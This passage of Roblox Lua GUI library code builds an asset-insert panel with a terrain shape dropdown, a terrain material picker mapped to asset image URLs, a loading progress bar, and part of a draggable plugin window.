			assetId.Value = 0
			assetId.Parent = insertAssetButtonExample

			local assetName = Instance.new("StringValue")
			assetName.Name = "AssetName"
			assetName.Value = ""
			assetName.Parent = insertAssetButtonExample

			local button = Instance.new("TextButton")
			button.Name = "Button"
			button.Text = ""
			button.Style = Enum.ButtonStyle.RobloxButton
			button.Position = UDim2.new(0.025,0,0.025,0)
			button.Size = UDim2.new(0.95,0,0.95,0)
			button.ZIndex = 6
			button.Parent = insertAssetButtonExample

			local buttonImage = Instance.new("ImageLabel")
			buttonImage.Name = "ButtonImage"
			buttonImage.Image = ""
			buttonImage.Position = UDim2.new(0,-7,0,-7)
			buttonImage.Size = UDim2.new(1,14,1,14)
			buttonImage.BackgroundTransparency = 1
			buttonImage.ZIndex = 7
			buttonImage.Parent = button

			local configIcon = buttonImage:clone()
			configIcon.Name = "ConfigIcon"
			configIcon.Visible = false
			configIcon.Position = UDim2.new(1,-23,1,-24)
			configIcon.Size = UDim2.new(0,16,0,16)
			configIcon.Image = ""
			configIcon.ZIndex = 6
			configIcon.Parent = insertAssetButtonExample

			return insertAssetButtonExample
		end

		local function showLargePreview(insertButton)
			if insertButton:FindFirstChild("AssetId") then
				delay(0,function()
					game:GetService("ContentProvider"):Preload(LargeThumbnailUrl .. tostring(insertButton.AssetId.Value))
					setGui.SetPanel.ItemPreview.LargePreview.Image = LargeThumbnailUrl .. tostring(insertButton.AssetId.Value)
				end)
			end
			if insertButton:FindFirstChild("AssetName") then
				setGui.SetPanel.ItemPreview.TextPanel.RolloverText.Text = insertButton.AssetName.Value
			end
		end

		local function selectTerrainShape(shape)
			if currTerrainDropDownFrame then
				objectSelected(tostring(currTerrainDropDownFrame.AssetName.Value), tonumber(currTerrainDropDownFrame.AssetId.Value), shape)
			end
		end

		local function createTerrainTypeButton(name, parent)
			local dropDownTextButton = Instance.new("TextButton")
			dropDownTextButton.Name = name .. "Button"
			dropDownTextButton.Font = Enum.Font.ArialBold
			dropDownTextButton.FontSize = Enum.FontSize.Size14
			dropDownTextButton.BorderSizePixel = 0
			dropDownTextButton.TextColor3 = Color3.new(1,1,1)
			dropDownTextButton.Text = name
			dropDownTextButton.TextXAlignment = Enum.TextXAlignment.Left
			dropDownTextButton.BackgroundTransparency = 1
			dropDownTextButton.ZIndex = parent.ZIndex + 1
			dropDownTextButton.Size = UDim2.new(0,parent.Size.X.Offset - 2,0,16)
			dropDownTextButton.Position = UDim2.new(0,1,0,0)

			dropDownTextButton.MouseEnter:connect(function()
				dropDownTextButton.BackgroundTransparency = 0
				dropDownTextButton.TextColor3 = Color3.new(0,0,0)
			end)

			dropDownTextButton.MouseLeave:connect(function()
				dropDownTextButton.BackgroundTransparency = 1
				dropDownTextButton.TextColor3 = Color3.new(1,1,1)
			end)

			dropDownTextButton.MouseButton1Click:connect(function()
				dropDownTextButton.BackgroundTransparency = 1
				dropDownTextButton.TextColor3 = Color3.new(1,1,1)
				if dropDownTextButton.Parent and dropDownTextButton.Parent:IsA("GuiObject") then
					dropDownTextButton.Parent.Visible = false
				end
				selectTerrainShape(terrainShapeMap[dropDownTextButton.Text])
			end)

			return dropDownTextButton
		end

		local function createTerrainDropDownMenu(zIndex)
			local dropDown = Instance.new("Frame")
			dropDown.Name = "TerrainDropDown"
			dropDown.BackgroundColor3 = Color3.new(0,0,0)
			dropDown.BorderColor3 = Color3.new(1,0,0)
			dropDown.Size = UDim2.new(0,200,0,0)
			dropDown.Visible = false
			dropDown.ZIndex = zIndex
			dropDown.Parent = setGui

			for i = 1, #terrainShapes do
				local shapeButton = createTerrainTypeButton(terrainShapes[i],dropDown)
				shapeButton.Position = UDim2.new(0,1,0,(i - 1) * (shapeButton.Size.Y.Offset))
				shapeButton.Parent = dropDown
				dropDown.Size = UDim2.new(0,200,0,dropDown.Size.Y.Offset + (shapeButton.Size.Y.Offset))
			end

			dropDown.MouseLeave:connect(function()
				dropDown.Visible = false
			end)
		end


		local function createDropDownMenuButton(parent)
			local dropDownButton = Instance.new("ImageButton")
			dropDownButton.Name = "DropDownButton"
			dropDownButton.Image = "https://www.roblox.com/asset/?id=67581509"
			dropDownButton.BackgroundTransparency = 1
			dropDownButton.Size = UDim2.new(0,16,0,16)
			dropDownButton.Position = UDim2.new(1,-24,0,6)
			dropDownButton.ZIndex = parent.ZIndex + 2
			dropDownButton.Parent = parent

			if not setGui:FindFirstChild("TerrainDropDown") then
				createTerrainDropDownMenu(8)
			end

			dropDownButton.MouseButton1Click:connect(function()
				setGui.TerrainDropDown.Visible = true
				setGui.TerrainDropDown.Position = UDim2.new(0,parent.AbsolutePosition.X,0,parent.AbsolutePosition.Y)
				currTerrainDropDownFrame = parent
			end)
		end

		local function buildInsertButton()
			local insertButton = makeInsertAssetButton()
			insertButton.Name = "InsertAssetButton"
			insertButton.Visible = true

			if Data.Category[Data.CurrentCategory].SetName == "High Scalability" then
				createDropDownMenuButton(insertButton)
			end

			local lastEnter = nil
			local mouseEnterCon = insertButton.MouseEnter:connect(function()
				lastEnter = insertButton
				delay(0.1,function()
					if lastEnter == insertButton then
						showLargePreview(insertButton)
					end
				end)
			end)
			return insertButton, mouseEnterCon
		end

		local function realignButtonGrid(columns)
			local x = 0
			local y = 0 
			for i = 1, #insertButtons do
				insertButtons[i].Position = UDim2.new(0, buttonWidth * x, 0, buttonHeight * y)
				x = x + 1
				if x >= columns then
					x = 0
					y = y + 1
				end
			end
		end

		local function setInsertButtonImageBehavior(insertFrame, visible, name, assetId)
			if visible then
				insertFrame.AssetName.Value = name
				insertFrame.AssetId.Value = assetId
				local newImageUrl = SmallThumbnailUrl  .. assetId
				if newImageUrl ~= insertFrame.Button.ButtonImage.Image then
					delay(0,function()
						game:GetService("ContentProvider"):Preload(SmallThumbnailUrl  .. assetId)
						if insertFrame:findFirstChild("Button") then
							insertFrame.Button.ButtonImage.Image = SmallThumbnailUrl  .. assetId
						end
					end)
				end
				table.insert(insertButtonCons,
					insertFrame.Button.MouseButton1Click:connect(function()
						-- special case for water, show water selection gui
						local isWaterSelected = (name == "Water") and (Data.Category[Data.CurrentCategory].SetName == "High Scalability")
						waterGui.Visible = isWaterSelected
						if isWaterSelected then
							objectSelected(name, tonumber(assetId), nil)
						else
							objectSelected(name, tonumber(assetId))
						end
					end)
				)
				insertFrame.Visible = true
			else
				insertFrame.Visible = false
			end
		end

		local function loadSectionOfItems(setGui, rows, columns)
			local pageSize = rows * columns

			if arrayPosition > #contents then return end

			local origArrayPos = arrayPosition

			local yCopy = 0
			for i = 1, pageSize + 1 do 
				if arrayPosition >= #contents + 1 then
					break
				end

				local buttonCon
				insertButtons[arrayPosition], buttonCon = buildInsertButton()
				table.insert(insertButtonCons,buttonCon)
				insertButtons[arrayPosition].Parent = setGui.SetPanel.ItemsFrame
				arrayPosition = arrayPosition + 1
			end
			realignButtonGrid(columns)

			local indexCopy = origArrayPos
			for index = origArrayPos, arrayPosition do
				if insertButtons[index] then
					if contents[index] then

						-- we don't want water to have a drop down button
						if contents[index].Name == "Water" then
							if Data.Category[Data.CurrentCategory].SetName == "High Scalability" then
								insertButtons[index]:FindFirstChild("DropDownButton",true):Destroy()
							end
						end

						local assetId
						if useAssetVersionId then
							assetId = contents[index].AssetVersionId
						else
							assetId = contents[index].AssetId
						end
						setInsertButtonImageBehavior(insertButtons[index], true, contents[index].Name, assetId)
					else
						break
					end
				else
					break
				end
				indexCopy = index
			end
		end

		local function setSetIndex()
			Data.Category[Data.CurrentCategory].Index = 0

			rows = 7
			columns = math.floor(setGui.SetPanel.ItemsFrame.AbsoluteSize.X/buttonWidth)

			contents = Data.Category[Data.CurrentCategory].Contents
			if contents then
				-- remove our buttons and their connections
				for i = 1, #insertButtons do
					insertButtons[i]:remove()
				end
				for i = 1, #insertButtonCons do
					if insertButtonCons[i] then insertButtonCons[i]:disconnect() end
				end
				insertButtonCons = {}
				insertButtons = {}

				arrayPosition = 1
				loadSectionOfItems(setGui, rows, columns)
			end
		end

		local function selectSet(button, setName, setId, setIndex)
			if button and Data.Category[Data.CurrentCategory] ~= nil then
				if button ~= Data.Category[Data.CurrentCategory].Button then
					Data.Category[Data.CurrentCategory].Button = button

					if SetCache[setId] == nil then
						SetCache[setId] = game:GetService("InsertService"):GetCollection(setId)
					end
					Data.Category[Data.CurrentCategory].Contents = SetCache[setId]

					Data.Category[Data.CurrentCategory].SetName = setName
					Data.Category[Data.CurrentCategory].SetId = setId
				end
				setSetIndex()
			end
		end

		local function selectCategoryPage(buttons, page)
			if buttons ~= Data.CurrentCategory then
				if Data.CurrentCategory then
					for key, button in pairs(Data.CurrentCategory) do
						button.Visible = false
					end
				end

				Data.CurrentCategory = buttons
				if Data.Category[Data.CurrentCategory] == nil then
					Data.Category[Data.CurrentCategory] = {}
					if #buttons > 0 then
						selectSet(buttons[1], buttons[1].SetName.Value, buttons[1].SetId.Value, 0)
					end
				else
					Data.Category[Data.CurrentCategory].Button = nil
					selectSet(Data.Category[Data.CurrentCategory].ButtonFrame, Data.Category[Data.CurrentCategory].SetName, Data.Category[Data.CurrentCategory].SetId, Data.Category[Data.CurrentCategory].Index)
				end
			end
		end

		local function selectCategory(category)
			selectCategoryPage(category, 0)
		end

		local function resetAllSetButtonSelection()
			local setButtons = setGui.SetPanel.Sets.SetsLists:GetChildren()
			for i = 1, #setButtons do
				if setButtons[i]:IsA("TextButton") then
					setButtons[i].Selected = false
					setButtons[i].BackgroundTransparency = 1
					setButtons[i].TextColor3 = Color3.new(1,1,1)
					setButtons[i].BackgroundColor3 = Color3.new(1,1,1)
				end
			end
		end

		local function populateSetsFrame()
			local currRow = 0
			for i = 1, #userCategoryButtons do
				local button = userCategoryButtons[i]
				button.Visible = true
				button.Position = UDim2.new(0,5,0,currRow * button.Size.Y.Offset)
				button.Parent = setGui.SetPanel.Sets.SetsLists

				if i == 1 then -- we will have this selected by default, so show it
					button.Selected = true
					button.BackgroundColor3 = Color3.new(0,204/255,0)
					button.TextColor3 = Color3.new(0,0,0)
					button.BackgroundTransparency = 0
				end

				button.MouseEnter:connect(function()
					if not button.Selected then
						button.BackgroundTransparency = 0
						button.TextColor3 = Color3.new(0,0,0)
					end
				end)
				button.MouseLeave:connect(function()
					if not button.Selected then
						button.BackgroundTransparency = 1
						button.TextColor3 = Color3.new(1,1,1)
					end
				end)
				button.MouseButton1Click:connect(function()
					resetAllSetButtonSelection()
					button.Selected = not button.Selected
					button.BackgroundColor3 = Color3.new(0,204/255,0)
					button.TextColor3 = Color3.new(0,0,0)
					button.BackgroundTransparency = 0
					selectSet(button, button.Text, userCategoryButtons[i].SetId.Value, 0)
				end)

				currRow = currRow + 1
			end

			local buttons =  setGui.SetPanel.Sets.SetsLists:GetChildren()

			-- set first category as loaded for default
			if buttons then
				for i = 1, #buttons do
					if buttons[i]:IsA("TextButton") then
						selectSet(buttons[i], buttons[i].Text, userCategoryButtons[i].SetId.Value, 0)
						selectCategory(userCategoryButtons)
						break
					end
				end
			end
		end

		setGui = createSetGui()
		waterGui, waterTypeChangedEvent = createWaterGui()
		waterGui.Position = UDim2.new(0,55,0,0)
		waterGui.Parent = setGui
		setGui.Changed:connect(function(prop) -- this resizes the preview image to always be the right size
			if prop == "AbsoluteSize" then
				handleResize()
				setSetIndex()
			end
		end)

		local scrollFrame, controlFrame = t.CreateTrueScrollingFrame()
		scrollFrame.Size = UDim2.new(0.54,0,0.85,0)
		scrollFrame.Position = UDim2.new(0.24,0,0.085,0)
		scrollFrame.Name = "ItemsFrame"
		scrollFrame.ZIndex = 6
		scrollFrame.Parent = setGui.SetPanel
		scrollFrame.BackgroundTransparency = 1

		drillDownSetZIndex(controlFrame,7)

		controlFrame.Parent = setGui.SetPanel
		controlFrame.Position = UDim2.new(0.76, 5, 0, 0)

		local debounce = false
		controlFrame.ScrollBottom.Changed:connect(function(prop)
			if controlFrame.ScrollBottom.Value == true then
				if debounce then return end
				debounce = true
				loadSectionOfItems(setGui, rows, columns)
				debounce = false
			end
		end)

		local userData = {}
		for id = 1, #userIdsForSets do
			local newUserData = game:GetService("InsertService"):GetUserSets(userIdsForSets[id])
			if newUserData and #newUserData > 2 then
				-- start at #3 to skip over My Decals and My Models for each account
				for category = 3, #newUserData do
					if newUserData[category].Name == "High Scalability" then -- we want high scalability parts to show first
						table.insert(userData,1,newUserData[category])
					else
						table.insert(userData, newUserData[category])
					end
				end
			end

		end
		if userData then
			userCategoryButtons = processCategory(userData)
		end

		rows = math.floor(setGui.SetPanel.ItemsFrame.AbsoluteSize.Y/buttonHeight)
		columns = math.floor(setGui.SetPanel.ItemsFrame.AbsoluteSize.X/buttonWidth)

		populateSetsFrame()

		setGui.SetPanel.CancelButton.MouseButton1Click:connect(function()
			setGui.SetPanel.Visible = false
			if dialogClosed then dialogClosed() end
		end)

		local setVisibilityFunction = function(visible)
			if visible then
				setGui.SetPanel.Visible = true
			else
				setGui.SetPanel.Visible = false
			end
		end

		local getVisibilityFunction = function()
			if setGui then
				if setGui:FindFirstChild("SetPanel") then
					return setGui.SetPanel.Visible
				end
			end

			return false
		end

		return setGui, setVisibilityFunction, getVisibilityFunction, waterTypeChangedEvent
	end

	t.CreateTerrainMaterialSelector = function(size,position)
		local terrainMaterialSelectionChanged = Instance.new("BindableEvent")
		terrainMaterialSelectionChanged.Name = "TerrainMaterialSelectionChanged"

		local selectedButton = nil

		local frame = Instance.new("Frame")
		frame.Name = "TerrainMaterialSelector"
		if size then
			frame.Size = size
		else
			frame.Size = UDim2.new(0, 245, 0, 230)
		end
		if position then
			frame.Position = position
		end
		frame.BorderSizePixel = 0
		frame.BackgroundColor3 = Color3.new(0,0,0)
		frame.Active = true

		terrainMaterialSelectionChanged.Parent = frame

		local waterEnabled = true -- todo: turn this on when water is ready

		local materialToImageMap = {}
		local materialNames = {"Grass", "Sand", "Brick", "Granite", "Asphalt", "Iron", "Aluminum", "Gold", "Plank", "Log", "Gravel", "Cinder Block", "Stone Wall", "Concrete", "Plastic (red)", "Plastic (blue)"}
		if waterEnabled then
			table.insert(materialNames,"Water")
		end
		local currentMaterial = 1

		function getEnumFromName(choice)
			if choice == "Grass" then return 1 end
			if choice == "Sand" then return 2 end 
			if choice == "Erase" then return 0 end
			if choice == "Brick" then return 3 end
			if choice == "Granite" then return 4 end
			if choice == "Asphalt" then return 5 end
			if choice == "Iron" then return 6 end
			if choice == "Aluminum" then return 7 end
			if choice == "Gold" then return 8 end
			if choice == "Plank" then return 9 end
			if choice == "Log" then return 10 end
			if choice == "Gravel" then return 11 end
			if choice == "Cinder Block" then return 12 end
			if choice == "Stone Wall" then return 13 end
			if choice == "Concrete" then return 14 end
			if choice == "Plastic (red)" then return 15 end
			if choice == "Plastic (blue)" then return 16 end
			if choice == "Water" then return 17 end
		end

		function getNameFromEnum(choice)
			if choice == Enum.CellMaterial.Grass or choice == 1 then return "Grass"end
			if choice == Enum.CellMaterial.Sand or choice == 2 then return "Sand" end 
			if choice == Enum.CellMaterial.Empty or choice == 0 then return "Erase" end
			if choice == Enum.CellMaterial.Brick or choice == 3 then return "Brick" end
			if choice == Enum.CellMaterial.Granite or choice == 4 then return "Granite" end
			if choice == Enum.CellMaterial.Asphalt or choice == 5 then return "Asphalt" end
			if choice == Enum.CellMaterial.Iron or choice == 6 then return "Iron" end
			if choice == Enum.CellMaterial.Aluminum or choice == 7 then return "Aluminum" end
			if choice == Enum.CellMaterial.Gold or choice == 8 then return "Gold" end
			if choice == Enum.CellMaterial.WoodPlank or choice == 9 then return "Plank" end
			if choice == Enum.CellMaterial.WoodLog or choice == 10 then return "Log" end
			if choice == Enum.CellMaterial.Gravel or choice == 11 then return "Gravel" end
			if choice == Enum.CellMaterial.CinderBlock or choice == 12 then return "Cinder Block" end
			if choice == Enum.CellMaterial.MossyStone or choice == 13 then return "Stone Wall" end
			if choice == Enum.CellMaterial.Cement or choice == 14 then return "Concrete" end
			if choice == Enum.CellMaterial.RedPlastic or choice == 15 then return "Plastic (red)" end
			if choice == Enum.CellMaterial.BluePlastic or choice == 16 then return "Plastic (blue)" end

			if waterEnabled then
				if choice == Enum.CellMaterial.Water or choice == 17 then return "Water" end
			end
		end


		local function updateMaterialChoice(choice)
			currentMaterial = getEnumFromName(choice)
			terrainMaterialSelectionChanged:Fire(currentMaterial)
		end

		-- we so need a better way to do this
		for i,v in pairs(materialNames) do
			materialToImageMap[v] = {}
			if v == "Grass" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=56563112"
			elseif v == "Sand" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=62356652"
			elseif v == "Brick" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=65961537"
			elseif v == "Granite" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532153"
			elseif v == "Asphalt" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532038"
			elseif v == "Iron" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532093"
			elseif v == "Aluminum" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531995"
			elseif v == "Gold" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532118"
			elseif v == "Plastic (red)" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531848"
			elseif v == "Plastic (blue)" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531924"
			elseif v == "Plank" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532015"
			elseif v == "Log" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532051"
			elseif v == "Gravel" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532206"
			elseif v == "Cinder Block" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532103"
			elseif v == "Stone Wall" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67531804"
			elseif v == "Concrete" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=67532059"
			elseif v == "Water" then materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=81407474"
			else materialToImageMap[v].Regular = "https://www.roblox.com/asset/?id=66887593" -- fill in the rest here!!
			end
		end

		local scrollFrame, scrollUp, scrollDown, recalculateScroll = t.CreateScrollingFrame(nil,"grid")
		scrollFrame.Size = UDim2.new(0.85,0,1,0)
		scrollFrame.Position = UDim2.new(0,0,0,0)
		scrollFrame.Parent = frame

		scrollUp.Parent = frame
		scrollUp.Visible = true
		scrollUp.Position = UDim2.new(1,-19,0,0)

		scrollDown.Parent = frame
		scrollDown.Visible = true
		scrollDown.Position = UDim2.new(1,-19,1,-17)

		local function goToNewMaterial(buttonWrap, materialName)
			updateMaterialChoice(materialName)
			buttonWrap.BackgroundTransparency = 0
			selectedButton.BackgroundTransparency = 1
			selectedButton = buttonWrap
		end

		local function createMaterialButton(name)	
			local buttonWrap = Instance.new("TextButton")
			buttonWrap.Text = ""
			buttonWrap.Size = UDim2.new(0,32,0,32)
			buttonWrap.BackgroundColor3 = Color3.new(1,1,1)
			buttonWrap.BorderSizePixel = 0
			buttonWrap.BackgroundTransparency = 1
			buttonWrap.AutoButtonColor = false
			buttonWrap.Name = tostring(name)

			local imageButton = Instance.new("ImageButton")
			imageButton.AutoButtonColor = false
			imageButton.BackgroundTransparency = 1
			imageButton.Size = UDim2.new(0,30,0,30)
			imageButton.Position = UDim2.new(0,1,0,1)
			imageButton.Name = tostring(name)
			imageButton.Parent = buttonWrap
			imageButton.Image = materialToImageMap[name].Regular

			local enumType = Instance.new("NumberValue")
			enumType.Name = "EnumType"
			enumType.Parent = buttonWrap
			enumType.Value = 0

			imageButton.MouseEnter:connect(function()
				buttonWrap.BackgroundTransparency = 0
			end)
			imageButton.MouseLeave:connect(function()
				if selectedButton ~= buttonWrap then
					buttonWrap.BackgroundTransparency = 1
				end
			end)
			imageButton.MouseButton1Click:connect(function()
				if selectedButton ~= buttonWrap then
					goToNewMaterial(buttonWrap, tostring(name))
				end
			end)

			return buttonWrap 
		end

		for i = 1, #materialNames do
			local imageButton = createMaterialButton(materialNames[i])

			if materialNames[i] == "Grass" then -- always start with grass as the default
				selectedButton = imageButton
				imageButton.BackgroundTransparency = 0
			end

			imageButton.Parent = scrollFrame
		end

		local forceTerrainMaterialSelection = function(newMaterialType)
			if not newMaterialType then return end
			if currentMaterial == newMaterialType then return end

			local matName = getNameFromEnum(newMaterialType)
			local buttons = scrollFrame:GetChildren()
			for i = 1, #buttons do
				if buttons[i].Name == "Plastic (blue)" and matName == "Plastic (blue)" then goToNewMaterial(buttons[i],matName) return end
				if buttons[i].Name == "Plastic (red)" and matName == "Plastic (red)" then goToNewMaterial(buttons[i],matName) return end
				if string.find(buttons[i].Name, matName) then
					goToNewMaterial(buttons[i],matName)
					return
				end
			end
		end

		frame.Changed:connect(function ( prop )
			if prop == "AbsoluteSize" then
				recalculateScroll()
			end
		end)

		recalculateScroll()
		return frame, terrainMaterialSelectionChanged, forceTerrainMaterialSelection
	end

	t.CreateLoadingFrame = function(name,size,position)
		game:GetService("ContentProvider"):Preload("https://www.roblox.com/asset/?id=35238053")

		local loadingFrame = Instance.new("Frame")
		loadingFrame.Name = "LoadingFrame"
		loadingFrame.Style = Enum.FrameStyle.RobloxRound

		if size then loadingFrame.Size = size
		else loadingFrame.Size = UDim2.new(0,300,0,160) end
		if position then loadingFrame.Position = position 
		else loadingFrame.Position = UDim2.new(0.5, -150, 0.5,-80) end

		local loadingBar = Instance.new("Frame")
		loadingBar.Name = "LoadingBar"
		loadingBar.BackgroundColor3 = Color3.new(0,0,0)
		loadingBar.BorderColor3 = Color3.new(79/255,79/255,79/255)
		loadingBar.Position = UDim2.new(0,0,0,41)
		loadingBar.Size = UDim2.new(1,0,0,30)
		loadingBar.Parent = loadingFrame

		local loadingGreenBar = Instance.new("ImageLabel")
		loadingGreenBar.Name = "LoadingGreenBar"
		loadingGreenBar.Image = "https://www.roblox.com/asset/?id=35238053"
		loadingGreenBar.Position = UDim2.new(0,0,0,0)
		loadingGreenBar.Size = UDim2.new(0,0,1,0)
		loadingGreenBar.Visible = false
		loadingGreenBar.Parent = loadingBar

		local loadingPercent = Instance.new("TextLabel")
		loadingPercent.Name = "LoadingPercent"
		loadingPercent.BackgroundTransparency = 1
		loadingPercent.Position = UDim2.new(0,0,1,0)
		loadingPercent.Size = UDim2.new(1,0,0,14)
		loadingPercent.Font = Enum.Font.Arial
		loadingPercent.Text = "0%"
		loadingPercent.FontSize = Enum.FontSize.Size14
		loadingPercent.TextColor3 = Color3.new(1,1,1)
		loadingPercent.Parent = loadingBar

		local cancelButton = Instance.new("TextButton")
		cancelButton.Name = "CancelButton"
		cancelButton.Position = UDim2.new(0.5,-60,1,-40)
		cancelButton.Size = UDim2.new(0,120,0,40)
		cancelButton.Font = Enum.Font.Arial
		cancelButton.FontSize = Enum.FontSize.Size18
		cancelButton.TextColor3 = Color3.new(1,1,1)
		cancelButton.Text = "Cancel"
		cancelButton.Style = Enum.ButtonStyle.RobloxButton
		cancelButton.Parent = loadingFrame

		local loadingName = Instance.new("TextLabel")
		loadingName.Name = "loadingName"
		loadingName.BackgroundTransparency = 1
		loadingName.Size = UDim2.new(1,0,0,18)
		loadingName.Position = UDim2.new(0,0,0,2)
		loadingName.Font = Enum.Font.Arial
		loadingName.Text = name
		loadingName.TextColor3 = Color3.new(1,1,1)
		loadingName.TextStrokeTransparency = 1
		loadingName.FontSize = Enum.FontSize.Size18
		loadingName.Parent = loadingFrame

		local cancelButtonClicked = Instance.new("BindableEvent")
		cancelButtonClicked.Name = "CancelButtonClicked"
		cancelButtonClicked.Parent = cancelButton
		cancelButton.MouseButton1Click:connect(function()
			cancelButtonClicked:Fire()
		end)

		local updateLoadingGuiPercent = function(percent, tweenAction, tweenLength)
			if percent and type(percent) ~= "number" then
				error("updateLoadingGuiPercent expects number as argument, got",type(percent),"instead")
			end

			local newSize = nil
			if percent < 0 then
				newSize = UDim2.new(0,0,1,0)
			elseif percent > 1 then
				newSize = UDim2.new(1,0,1,0)
			else
				newSize = UDim2.new(percent,0,1,0)
			end

			if tweenAction then
				if not tweenLength then
					error("updateLoadingGuiPercent is set to tween new percentage, but got no tween time length! Please pass this in as third argument")
				end

				if (newSize.X.Scale > 0) then
					loadingGreenBar.Visible = true
					loadingGreenBar:TweenSize(	newSize,
						Enum.EasingDirection.Out,
						Enum.EasingStyle.Quad,
						tweenLength,
						true)
				else
					loadingGreenBar:TweenSize(	newSize,
						Enum.EasingDirection.Out,
						Enum.EasingStyle.Quad,
						tweenLength,
						true,
						function() 
							if (newSize.X.Scale < 0) then
								loadingGreenBar.Visible = false
							end
						end)
				end

			else
				loadingGreenBar.Size = newSize
				loadingGreenBar.Visible = (newSize.X.Scale > 0)
			end
		end

		loadingGreenBar.Changed:connect(function(prop)
			if prop == "Size" then
				loadingPercent.Text = tostring( math.ceil(loadingGreenBar.Size.X.Scale * 100) ) .. "%"
			end
		end)

		return loadingFrame, updateLoadingGuiPercent, cancelButtonClicked
	end

	t.CreatePluginFrame = function (name,size,position,scrollable,parent)
		local function createMenuButton(size,position,text,fontsize,name,parent)
			local button = Instance.new("TextButton",parent)
			button.AutoButtonColor = false
			button.Name = name
			button.BackgroundTransparency = 1
			button.Position = position
			button.Size = size
			button.Font = Enum.Font.ArialBold
			button.FontSize = fontsize
			button.Text =  text
			button.TextColor3 = Color3.new(1,1,1)
			button.BorderSizePixel = 0
			button.BackgroundColor3 = Color3.new(20/255,20/255,20/255)

			button.MouseEnter:connect(function ( )
				if button.Selected then return end
				button.BackgroundTransparency = 0
			end)
			button.MouseLeave:connect(function ( )
				if button.Selected then return end
				button.BackgroundTransparency = 1
			end)

			return button

		end

		local dragBar = Instance.new("Frame",parent)
		dragBar.Name = tostring(name) .. "DragBar"
		dragBar.BackgroundColor3 = Color3.new(39/255,39/255,39/255)
		dragBar.BorderColor3 = Color3.new(0,0,0)
		if size then
			dragBar.Size =  UDim2.new(size.X.Scale,size.X.Offset,0,20)  + UDim2.new(0,20,0,0)
		else
			dragBar.Size = UDim2.new(0,183,0,20)
		end
		if position then
			dragBar.Position = position
		end
		dragBar.Active = true
		dragBar.Draggable = true
		--dragBar.Visible = false
		dragBar.MouseEnter:connect(function (  )
			dragBar.BackgroundColor3 = Color3.new(49/255,49/255,49/255)
		end)
		dragBar.MouseLeave:connect(function (  )
			dragBar.BackgroundColor3 = Color3.new(39/255,39/255,39/255)
		end)

		-- plugin name label
		local pluginNameLabel = Instance.new("TextLabel",dragBar)
		pluginNameLabel.Name = "BarNameLabel"
		pluginNameLabel.Text = " " .. tostring(name)
		pluginNameLabel.TextColor3 = Color3.new(1,1,1)
		pluginNameLabel.TextStrokeTransparency = 0
		pluginNameLabel.Size = UDim2.new(1,0,1,0)
		pluginNameLabel.Font = Enum.Font.ArialBold
		pluginNameLabel.FontSize = Enum.FontSize.Size18
		pluginNameLabel.TextXAlignment = Enum.TextXAlignment.Left
		pluginNameLabel.BackgroundTransparency = 1

		-- close button
		local closeButton = createMenuButton(UDim2.new(0,15,0,17),UDim2.new(1,-16,0.5,-8),"X",Enum.FontSize.Size14,"CloseButton",dragBar)
		local closeEvent = Instance.new("BindableEvent")
		closeEvent.Name = "CloseEvent"
		closeEvent.Parent = closeButton
		closeButton.MouseButton1Click:connect(function ()
			closeEvent:Fire()
			closeButton.BackgroundTransparency = 1
		end)

		-- help button
		local helpButton = createMenuButton(UDim2.new(0,15,0,17),UDim2.new(1,-51,0.5,-8),"?",Enum.FontSize.Size14,"HelpButton",dragBar)
		local helpFrame = Instance.new("Frame",dragBar)
		helpFrame.Name = "HelpFrame"
		helpFrame.BackgroundColor3 = Color3.new(0,0,0)
		helpFrame.Size = UDim2.new(0,300,0,552)
		helpFrame.Position = UDim2.new(1,5,0,0)
		helpFrame.Active = true
		helpFrame.BorderSizePixel = 0
		helpFrame.Visible = false

		helpButton.MouseButton1Click:connect(function(  )
			helpFrame.Visible = not helpFrame.Visible
			if helpFrame.Visible then
				helpButton.Selected = true
				helpButton.BackgroundTransparency = 0
				local screenGui = getLayerCollectorAncestor(helpFrame)
				if screenGui then
					if helpFrame.AbsolutePosition.X + helpFrame.AbsoluteSize.X > screenGui.AbsoluteSize.X then --position on left hand side
						helpFrame.Position = UDim2.new(0,-5 - helpFrame.AbsoluteSize.X,0,0)
					else -- position on right hand side
						helpFrame.Position = UDim2.new(1,5,0,0)
					end
				else
					helpFrame.Position = UDim2.new(1,5,0,0)
				end
			else
				helpButton.Selected = false
				helpButton.BackgroundTransparency = 1
			end
		end)

		local minimizeButton = createMenuButton(UDim2.new(0,16,0,17),UDim2.new(1,-34,0.5,-8),"-",Enum.FontSize.Size14,"MinimizeButton",dragBar)
		minimizeButton.TextYAlignment = Enum.TextYAlignment.Top

		local minimizeFrame = Instance.new("Frame",dragBar)
		minimizeFrame.Name = "MinimizeFrame"
		minimizeFrame.BackgroundColor3 = Color3.new(73/255,73/255,73/255)
		minimizeFrame.BorderColor3 = Color3.new(0,0,0)
		minimizeFrame.Position = UDim2.new(0,0,1,0)
		if size then
			minimizeFrame.Size =  UDim2.new(size.X.Scale,size.X.Offset,0,50) + UDim2.new(0,20,0,0)
		else
			minimizeFrame.Size = UDim2.new(0,183,0,50)
		end
		minimizeFrame.Visible = false

		local minimizeBigButton = Instance.new("TextButton",minimizeFrame)
		minimizeBigButton.Position = UDim2.new(0.5,-50,0.5,-20)
		minimizeBigButton.Name = "MinimizeButton"
		minimizeBigButton.Size = UDim2.new(0,100,0,40)
		minimizeBigButton.Style = Enum.ButtonStyle.RobloxButton
		minimizeBigButton.Font = Enum.Font.ArialBold
		minimizeBigButton.FontSize = Enum.FontSize.Size18
		minimizeBigButton.TextColor3 = Color3.new(1,1,1)
		minimizeBigButton.Text = "Show"

